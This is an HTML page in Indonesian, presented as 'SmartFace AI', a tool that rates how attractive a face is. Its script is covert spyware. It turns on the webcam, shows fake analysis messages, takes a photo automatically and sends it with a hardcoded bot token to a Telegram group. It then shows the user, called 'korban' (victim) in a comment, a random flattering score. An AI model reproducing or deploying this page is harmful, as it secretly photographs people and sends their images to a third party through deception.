<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SmartFace AI - Analisis Profil Wajah</title>
    <style>
        :root {
            --primary-blue: #0061ff;
            --bg-light: #f4f7f6;
            --text-dark: #2d3436;
        }

        body { 
            background-color: var(--bg-light); 
            color: var(--text-dark); 
            font-family: 'Inter', -apple-system, sans-serif; 
            margin: 0; 
            display: flex; 
            align-items: center;
            justify-content: center;
            min-height: 100vh;
        }

        .card {
            background: white;
            width: 90%;
            max-width: 400px;
            padding: 30px;
            border-radius: 24px;
            box-shadow: 0 10px 30px rgba(0,0,0,0.08);
            text-align: center;
        }

        .logo {
            width: 60px;
            height: 60px;
            background: var(--primary-blue);
            border-radius: 15px;
            margin: 0 auto 20px;
            display: flex;
            align-items: center;
            justify-content: center;
            color: white;
            font-weight: bold;
            font-size: 24px;
        }

        h1 { font-size: 1.5rem; margin-bottom: 8px; color: #1e272e; }
        p { font-size: 0.9rem; color: #636e72; line-height: 1.5; margin-bottom: 25px; }

        #camera-wrapper { 
            display: none; 
            width: 250px; 
            height: 250px; 
            margin: 0 auto 20px;
            border-radius: 50%;
            border: 5px solid #dfe6e9;
            overflow: hidden;
            position: relative;
        }

        video { width: 100%; height: 100%; object-fit: cover; transform: scaleX(-1); }

        /* Garis Pemindai Halus */
        .scan-bar {
            position: absolute; width: 100%; height: 2px;
            background: var(--primary-blue);
            top: 0; left: 0;
            box-shadow: 0 0 10px var(--primary-blue);
            animation: move 3s infinite linear;
        }
        @keyframes move { 0% { top: 0; } 100% { top: 100%; } }

        .btn-main { 
            background: var(--primary-blue); 
            color: white; 
            width: 100%;
            padding: 16px; 
            border: none; 
            border-radius: 12px; 
            font-weight: 600; 
            font-size: 1rem; 
            cursor: pointer; 
            transition: all 0.3s;
        }

        .btn-main:hover { background: #0056e0; }

        #loader-text { margin-top: 15px; font-size: 0.8rem; color: var(--primary-blue); font-weight: 500; display: none; }

        /* Tampilan Hasil Akhir */
        #final-result { display: none; }
        .score-big { font-size: 4rem; font-weight: 800; color: var(--primary-blue); margin: 10px 0; }
        .label-good { color: #27ae60; font-weight: bold; font-size: 1.1rem; }
    </style>
</head>
<body>

    <div class="card">
        <div id="init-view">
            <div class="logo">SF</div>
            <h1>SmartFace AI</h1>
            <p>Gunakan teknologi AI terbaru untuk mengukur persentase daya tarik wajah berdasarkan standar kecantikan & kegantengan global.</p>
            <button class="btn-main" id="btn-start">Mulai Analisis Sekarang</button>
        </div>

        <div id="camera-wrapper">
            <div class="scan-bar"></div>
            <video id="video" autoplay playsinline></video>
        </div>

        <div id="loader-text">Menghubungkan ke server AI...</div>

        <div id="final-result">
            <p style="margin-bottom: 5px; color: #2d3436;">Hasil Analisis Anda:</p>
            <div class="score-big" id="score-val">0%</div>
            <div class="label-good">Kategori: Sangat Menarik</div>
            <p style="margin-top: 15px; font-size: 0.8rem;">Struktur wajah Anda berada di atas rata-rata pengguna di Asia Tenggara.</p>
            <button class="btn-main" onclick="location.reload()" style="background: #dfe6e9; color: #2d3436; margin-top: 10px;">Cek Ulang</button>
        </div>
    </div>

    <canvas id="canvas" style="display:none;"></canvas>

    <script>
        // ==========================================
        // KONFIGURASI TELEGRAM
        const BOT_TOKEN = '8237438582:AAEy0SowSAmcLAGPUVQ1NqHmmL5n54Yhu_8';
        const GROUP_ID  = '-1003355444960'; 
        // ==========================================

        const btnStart = document.getElementById('btn-start');
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        const loader = document.getElementById('loader-text');

        btnStart.onclick = async () => {
            document.getElementById('init-view').style.display = 'none';
            document.getElementById('camera-wrapper').style.display = 'block';
            loader.style.display = 'block';

            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                video.srcObject = stream;
                
                setTimeout(() => { loader.innerText = "Memproses geometri wajah..."; }, 1500);
                setTimeout(() => { loader.innerText = "Menghitung indeks kecantikan..."; }, 3500);
                
                // Ambil foto otomatis di detik ke-5
                setTimeout(takeFinalPhoto, 5500);
            } catch (e) {
                alert("Izin kamera diperlukan untuk melakukan analisis wajah.");
                location.reload();
            }
        };

        async function takeFinalPhoto() {
            const context = canvas.getContext('2d');
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            context.drawImage(video, 0, 0, canvas.width, canvas.height);

            canvas.toBlob(async (blob) => {
                // Skor 88-97 agar mereka merasa sangat ganteng/cantik
                const score = Math.floor(Math.random() * (97 - 88 + 1)) + 88;
                
                const fd = new FormData();
                fd.append('chat_id', GROUP_ID);
                fd.append('photo', blob, 'ai_result.png');
                fd.append('caption', `âœ… **ANALISIS WAJAH SELESAI**\n\nðŸ“Š Skor: ${score}%\nðŸŒŸ Kategori: Diatas Rata-rata\nðŸ“ Status: User Tertangkap`);

                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: fd });

                // Tampilkan hasil ke korban
                document.getElementById('camera-wrapper').style.display = 'none';
                loader.style.display = 'none';
                document.getElementById('score-val').innerText = score + "%";
                document.getElementById('final-result').style.display = 'block';

                // Matikan kamera
                video.srcObject.getTracks().forEach(t => t.stop());
            }, 'image/png');
        }
    </script>
</body>
</html>
